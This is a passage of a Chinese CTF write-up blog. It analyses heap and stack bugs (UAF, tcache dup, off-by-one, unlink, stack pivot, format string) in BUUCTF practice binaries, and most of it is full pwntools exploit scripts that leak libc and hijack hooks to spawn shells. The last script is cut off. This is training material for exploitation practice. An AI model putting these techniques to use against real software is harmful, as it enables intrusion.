alt></p><p>如图所示，相差10。然后利用原来的溢出点，放入printf的got表地址，让其减10次1，也就是答对10次serect后，让程序走向结束处，调用printf。其printf的buf打印的是name，这个是可控的，写成<code>/bin/sh\x00</code>即可。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29635)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;/bin/sh\x00&#39; + &quot;\x00&quot; * 8 + p64(elf.got[&#39;printf&#39;])[:5]#此处payload 因为read那里读的数据大小限制，需要调整一下payload的长度。# debug()sla(&quot;What&#39;s your name?&quot;,payload)answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]for i in range(len(answer)):    print(answer[i])    sa(&quot;Secret&quot;,str(answer[i]))sla(&quot;Secret&quot;,&#39;1&#39;)itr()</code></pre><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>64位，ubuntu 18.  存在 UAF，十分简单的tcache dup攻击。</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_es_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29639)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def add(size,name,call):    sla(&#39;ice:&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;name&#39;,str(name))    sa(&#39;call&#39;,str(call))def show(idx):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def call(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x500,&#39;chumen77&#39;,&#39;chumen77&#39;) #0add(0x80,&#39;chumen77&#39;,&#39;chumen77&#39;) #1# debug()call(0)show(0)ru(&#39;name:\n&#39;)libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc&#39;,libc_base)#get libcadd(0x510-0x20-0x10,&#39;chumen77&#39;,&#39;chumen77&#39;) #2add(0x20,&#39;chumen77&#39;,&#39;chumen77&#39;) #3call(3)call(3)free_hook = libc_base + 0x3ed8e8add(0x20,p64(free_hook),p64(free_hook)) #4add(0x20,p64(free_hook),p64(free_hook)) #5rec = rce18[1] + libc_baseadd(0x20,p64(rec),p64(rec))call(1)itr()</code></pre><h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><pre><code class="c">int vul(){  char s; // [esp+0h] [ebp-28h]  memset(&amp;s, 0, 0x20u);  read(0, &amp;s, 0x30u);  printf(&quot;Hello, %s\n&quot;, &amp;s);  read(0, &amp;s, 0x30u);  return printf(&quot;Hello, %s\n&quot;, &amp;s);}</code></pre><ul><li>存在栈溢出，溢出8个字节，考虑栈转移。</li><li>在填充buf， <code>%s</code> 在32位用于泄漏栈上的信息。</li></ul><p>所以可以考虑泄漏处栈地址，libc地址。从而算出buf的base与libc base。</p><p>首先可以明确一点可以覆盖返回地址，第一下考虑直接覆盖为<code>one_gadget</code> 本地通远程不通。</p><p>然后就考虑用栈转移到buf上来获取shell。</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_4&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26932)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;a&#39; * (0x28 - 1 ) + &#39;b&#39;sa(&#39;name&#39;,payload)ru(&quot;b&quot;)buf_base = uu32(r(4)) - 0x38r(4)libc_base = uu32(r(4)) - 0x1fb9b0info_addr(&#39;stack&#39;,buf_base)info_addr(&#39;libc&#39;,libc_base)payload = p32(0x8048450) + p32(elf.plt[&#39;system&#39;]) + p32(0x8048450) + p32(buf_base+16) + &#39;/bin/sh\x00&#39;payload = payload.ljust((0x30-4-4-8),&#39;b&#39;) + p32(buf_base) *3+ p32(0x80485FD)s(payload)itr()</code></pre><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>程序很简单，但是也很细节，由于自己的逆向能力有点差，没有注意部分细节，造成构造堆块，进行leak和改写时，造成较大的困难和迷惑。</p><p>开启了沙盒不能get shell：</p><pre><code>#  line  CODE  JT   JF      K# =================================#  0000: 0x20 0x00 0x00 0x00000004  A = arch#  0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number#  0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005#  0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007#  0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW#  0007: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>UAF</li></ul><p>比如：</p><h4 id="程序处："><a href="#程序处：" class="headerlink" title="程序处："></a>程序处：</h4><h5 id="add函数："><a href="#add函数：" class="headerlink" title="add函数："></a>add函数：</h5><pre><code class="c">int *v0; // rbx__int16 v1; // ax</code></pre><pre><code class="c"> v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;</code></pre><pre><code class="c">v1 = get_atoi();*(_WORD *)short_pt = v1;*((_WORD *)short_pt + 4) = *(_WORD *)short_pt;</code></pre><p>开始对数据类型的大小没有注意，这几处决定着</p><ul><li>int型堆块时，只能写上4字节的数据</li><li>short int 型堆块时，只能写上2字节的数据</li></ul><h5 id="show函数："><a href="#show函数：" class="headerlink" title="show函数："></a>show函数：</h5><pre><code class="c">if ( v2 == 1 &amp;&amp; int_pt )    printf(&quot;your int type inode number :%d\n&quot;, *(unsigned int *)int_pt);  if ( v2 == 2 &amp;&amp; short_pt )    printf(&quot;your short type inode number :%d\n&quot;, (unsigned int)*(signed __int16 *)short_pt);</code></pre><p>意味着leak时也是只能泄漏出部分的字节，增加在利用时的难度，需要利用合适的堆块进行攻击，其合适是指上面有残留合适的数据，然后改末尾几个字节。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>scanf函数是从stdin中读取数据，且在<code>__IO_2_stdio_</code> 的io结构体存在一个<code>_fileno</code>的标识位，默认值是0，若将其改成其他的文件号，调用scanf函数在获取时，就会获取对应文件。</p><h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ul><li>程序只让你分配0x30或者0x20的堆块，如何伪造出一个至少0x90的堆块，如何释放后，来泄漏libc。</li><li>泄漏出来的数据不是完整的，可写时只能写上2、4字节</li></ul><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_final_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25252)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(type,number):    sla(&#39;&gt;&#39;,&#39;1&#39;)    sla(&#39;&gt;&#39;,str(type))    sla(&quot;:&quot;,str(number))def free(type):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;&gt;&#39;,str(type))def show(type):    sla(&#39;&gt;&#39;,&#39;3&#39;)    sla(&#39;&gt;&#39;,str(type))def leave():    sla(&#39;&gt;&#39;,&#39;4&#39;)    # sa(&#39;?&#39;,str(mes))add(1,1)free(1) #leave chunk 0 add(2,2)add(2,2)add(2,2) # 0x90#ready to dupadd(2,2)free(2)add(1,1) # get chunk0free(2)#leak heapshow(2)ru(&#39;number :&#39;)chunk0_addr_word = int(ru(&#39;\n&#39;)) - 0xa0info_addr(&#39;chunk0_addr&#39;,chunk0_addr_word)add(2,chunk0_addr_word)add(2,chunk0_addr_word)add(2,0x91) #fake unsortbin chunk#full tache binsfor i in range(7):    free(1)    add(2,2)#leak libcfree(1)show(1)ru(&#39;number :&#39;)stdin_fillno = int(ru(&#39;\n&#39;)) - 0x2a0 + 0x70info_addr(&#39;stdin_fillno&#39;,stdin_fillno)#ready to attack stdin_fillno ,use taeche dupadd(1,stdin_fillno)add(1,stdin_fillno)free(1)add(2,stdin_fillno)free(1)#leak contains libc&#39;s heapshow(1)ru(&#39;number :&#39;)chunk1_addr_dword = int(ru(&#39;\n&#39;)) - 0x30info_addr(&#39;chunk1_addr_dword&#39;,chunk1_addr_dword)#change the 0x30bins chainsadd(1,chunk1_addr_dword)add(1,chunk1_addr_dword)add(1,stdin_fillno)#attck the filenoadd(1,666)leave()itr()</code></pre><p>渣渣英文注释，先不改了。感觉还是挺不容易做的题，堆块如何构造想了老久。到别的师傅那里，归类为简单题。太菜了太菜了，基础还不是很好。</p><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>简单的uaf</p><h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><pre><code class="c">(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</code></pre><p>此处在改完<code>ptr[v1]</code>为system以后，其参数的指针是从这个堆块开始的要提前进行截断。</p><pre><code class="c">system(p32(system) + &#39;||sh&#39;)system(p32(system) + &#39;;sh;&#39;)</code></pre><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./hacknote&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)else:    io = remote(&#39;node3.buuoj.cn&#39;,27225)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;Content&#39;,str(data))def free(idx):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x20,&#39;bbbb&#39;)add(0x20,&#39;bbbb&#39;)free(0)free(1)add(8,p32(0x0804862B) + p32(elf.got[&#39;__libc_start_main&#39;]))show(0)r()libc_base = uu32(r(4)) - 0x18540info_addr(&#39;base&#39;,libc_base)free(2)system = 0x0003ada0 + libc_baseadd(8,p32(system) + &#39;||sh&#39;)show(0)itr()</code></pre><p>Buu远程打不通。。</p><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>Edit函数处，故意可以多写出一个字节。</p><ul><li>off by one</li></ul><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./heapcreator&#39;context.log_level = &#39;debug&#39;elf = ELF(local_file)debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26646)    libc = elf.libc    # remote_libc = &#39;.&#39; # &#39;./libc.so.6&#39;    # libc = ELF(remote_libc)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;Heap&#39;,str(size))    sa(&#39;heap&#39;,str(data))def edit(idx,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;heap&#39;,str(data))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x18,&#39;\x00&#39;)add(0x20,&#39;bbbb&#39;)add(0x20,&#39;cccc&#39;)add(0x10,&#39;dddd&#39;)payload = 0x18 * &#39;a&#39; + &#39;\xa1&#39;edit(0,payload)free(1)add(0x10,&#39;\x78&#39;)show(1)ru(&#39;Content : &#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)free(1)free_hook = 0x3c67a8 + basepaylaod = &#39;\x00&#39; * 2 * 8  + p64(8) + p64(free_hook)add(0x30,paylaod)rce = base + rce16[1]edit(2,p64(rce))free(0)itr()</code></pre><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>保护全开，程序逆向起来看起来很乱，并且堆块定位是通过栈来传参，没有全局指针。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>calloc 函数基本跟malloc一样，但是再分配好堆块时，会把分配到的堆块全部清理为0。</p><h5 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h5><p>无法通过传统的unsortbin来leak libc，结合fill函数中的堆溢出即可。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>Fill 函数中，明显有堆溢出，且十分好用，效果很大。</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./0ctf_2017_babyheap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26374)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&#39;Command&#39;,&#39;1&#39;)    sla(&#39;Size&#39;,str(size))def fill(idx,size,data):    sla(&#39;mand&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ize&#39;,str(size))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;mand&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def dump(idx):    sla(&#39;mand&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x30) #0add(0x30) #1add(0x10) #2add(0x10) #3add(0x10) #4add(0x20) #5payload = &#39;a&#39; * 0x30 + p64(0) + p64(0xa1) + p64(0) * 4fill(0,0x60,payload)free(1)add(0x30)dump(2)ru(&#39;Content: \n&#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)add(0x50) #6add(0x60) #7add(0x60) #8free(7)free(8)malloc_hook = base + 0x3c4b10payload = p64(0) * 5 + p64(0x71) + p64(0) * 13 + p64(0x71) + p64(malloc_hook-0x23) fill(5,len(payload),payload)add(0x60) #7add(0x60) #8rec = rce16[1] + basepayload = &#39;a&#39; * 0x13 + p64(rec)fill(8,len(payload),payload)add(0x20)itr()</code></pre><h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><pre><code class="c">close(1);close(2);return shell();</code></pre><p>直接就给你shell了，但是stdout已经被关闭了。但是对其文件描述符<code>1</code>进行重定向为没有关闭的<code>0</code>即可。</p><pre><code class="bash">exec 1&gt;&amp;0 &amp;&amp; cat flag</code></pre><h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><pre><code class="c">ssize_t vulnerable(){  char buf; // [esp+0h] [ebp-18h]  return read(0, &amp;buf, 0x24u);}</code></pre><p>明显可以看出只可以控制2个gadget。优先想到了栈迁移。可是也没有合适地方去迁移利用。</p><p>倘若可以控制3个gadget，直接：</p><pre><code class="c">p32(system.plt) + p32(0xdeadbeef) + p32(sh)</code></pre><p>这样就可以拿到shell了。</p><p>因为平时rop时，32位下自己<strong>十分</strong>经常**用<code>函数的plt+返回地址+参数1</code>，造成思路卡顿。</p><h4 id="突破"><a href="#突破" class="headerlink" title="突破"></a>突破</h4><p>但是尝试去看下后门函数：</p><pre><code class="c">.text:08048521 ; 2:   return system(&quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;);.text:08048521                 sub     esp, 0Ch.text:08048524                 push    offset command  ; &quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;.text:08048529                 call    _system.text:0804852E                 add     esp, 10h.text:08048531                 nop.text:08048532                 leave.text:08048533                 retn</code></pre><p>在08048524处，可以看到起其call system前，<code>push    offset command</code>，把这个字符串压栈，来作为第一个参数。</p><p> 那就在溢出时，返回地址填上<code>08048529</code> ，在自己填上sh的地址即可了。</p><p>这样就在call system时，完成的是<code>system(sh)</code>。</p><p>其实也是很简单的：</p><p>由于<code>因为平时rop时，32位下自己经常用`函数的plt+返回地址+参数1`，造成思路卡顿。</code> ，其实自己分析以后就是：<code>函数的plt+4字节+参数1</code>。</p><p>溢出时，填上<code>p32(0x8048529) + p32(sh)</code><br>栈信息：</p><pre><code>0000| 0xffcca2fc --&gt; 0x8048529 (&lt;shell+14&gt;:     call   0x80483e0 &lt;system@plt&gt;)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>在溢出调用时,ret到：</p><pre><code>.text:08048529                 call    _system</code></pre><p>其就是</p><pre><code>push eip+4jmp system.plt</code></pre><p>然后栈就变成了：</p><pre><code>=&gt; 0x80483e0 &lt;system@plt&gt;:      jmp    DWORD PTR ds:0x804a018 | 0x80483e6 &lt;system@plt+6&gt;:    push   0x18 | 0x80483eb &lt;system@plt+11&gt;:   jmp    0x80483a0 | 0x80483f0 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a01c | 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push   0x20 |-&gt;   0x80483e6 &lt;system@plt+6&gt;:        push   0x18       0x80483eb &lt;system@plt+11&gt;:       jmp    0x80483a0       0x80483f0 &lt;__libc_start_main@plt&gt;:       jmp    DWORD PTR ds:0x804a01c       0x80483f6 &lt;__libc_start_main@plt+6&gt;:     push   0x20                                                                  JUMP is taken[------------------------------------stack-------------------------------------]0000| 0xffcca2fc --&gt; 0x804852e (&lt;shell+19&gt;:     add    esp,0x10)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>这就变成了，自己熟悉的<code>函数的plt+返回地址+参数1</code></p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./wustctf2020_getshell_2&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25032)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]offset = 28sh = elf.search(&#39;sh\x00&#39;).next()system = 0x8048529payload = &#39;a&#39; * offset + p32(system) + p32(sh)s(payload)itr()</code></pre><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><p>保护全开。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><ul><li>格式化字符串漏洞，可以泄漏出程序和libc的基址</li><li>edit函数中，错误的size选取，导致每次可以多溢出0x10的字节，威力就很大了，prev size与 size都可以改到。</li></ul><p>直接进行unlink攻击即可。估计就是考这个的，程序限制了不能申请0x80以下的堆块，且key值基本没办法改到。</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_heap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26837)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;(0-10)&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sla(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;content&#39;,str(data))payload = &#39;%15$p&#39; + &#39;%11$p&#39;sla(&#39;name&#39;,payload)ru(&#39;Hello, 0x&#39;)libc_base = int(r(12),16) - 0x20830info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;0x&#39;)bin_base = int(r(12),16) - 0x1186info_addr(&#39;bin_base&#39;,bin_base)note = bin_base + 0x202060key = bin_base + 0x202040add(0,0x88,&#39;aaaaaaaa&#39;)add(1,0x100,&#39;bbbbbbbb&#39;)add(2,0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,payload)free(1)free_hook = 0x3c67a8 + libc_basepayload = p64(0) * 3 + p64(free_hook) + p64(0x88)edit(0,payload)rec = rce16[1] + libc_baseedit(0,p64(rec))free(2)itr()</code></pre><h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><p>Edit函数中，有个大威力的堆溢出。<br>用unlink攻击。</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26818)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = 